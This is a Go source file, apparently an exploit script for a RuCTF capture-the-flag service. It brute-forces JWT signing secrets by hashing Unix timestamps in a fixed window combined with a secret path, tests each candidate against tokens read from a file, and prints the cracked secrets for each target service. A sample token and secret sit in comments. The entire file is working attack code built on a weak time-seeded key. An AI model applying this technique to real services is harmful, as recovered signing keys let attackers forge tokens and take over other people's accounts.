package main

import (
	"bufio"
	"crypto/sha256"
	"fmt"
	"log"
	"os"
	"ructf-radio-sploit/auth"
	"strings"
)

// const (
// 	token_to_crack = "eyJhbGciOiI0MiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZGVycGFkZXJwIn0.3OVsajAAa4NHNvUieJWnOVjTlwoNssgb+ty1LyXI0uIwbKDbRCkEVMMZp8rHDHvekYRP+TT8Pm+Cewj/TSg5PvIrTw7dwvsTyB6uqNr78mCnEoZpDQLvtyoSjBiD76uskl3Xz/neoZrUzTkG+cxcV9YkgdnqaXoPV8MKFO3Ut+0="
// )

type AuthPayload struct {
	User string `user`
}

func readTokens() (tokens []string) {
	file, err := os.Open("tokens.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		tokens = append(tokens, strings.TrimSpace(scanner.Text()))
	}
	return
}

func crack(token string, sc chan *CrackedSecret) {
	parts := strings.Split(token, ",")
	tokenToCrack := parts[1]
	// println(token_to_crack)

	for t := 1574506800; t < 1574524537; t++ {
		plain := fmt.Sprintf("\"%v\"/secrets/jwt_secret", t)
		// println(plain)
		secret := fmt.Sprintf("%x", sha256.Sum256([]byte(plain)))
		// println(secret)
		err := auth.InitAuth(secret)
		if err != nil {
			panic(err)
		}
		// println("inited")
		var payload AuthPayload
		err = auth.Decode(tokenToCrack, &payload)
		if err == nil {
			sc <- &CrackedSecret{
				parts[0],
				secret,
				t,
			}
			return
		}
	}
	sc <- nil
}

type CrackedSecret struct {
	Service string
	Secret  string
	t       int
}

func main() {
	tokens := readTokens()
	secrets := make(chan *CrackedSecret)

	for _, token := range tokens {
		go crack(token, secrets)
	}

	s := 0
	for r := 0; r < len(tokens); r++ {
		secret := <-secrets
		if secret != nil {
			s++
			fmt.Printf("%v,%v,%v\n", secret.Service, secret.Secret, secret.t)
		}
	}

	fmt.Printf("%v / %v\n", s, len(tokens))
	// secret := "2a1b317063259394a61c326277d2a01c82c5b38a4e4ae692074a7e2de5b178d9"
	// users()
}
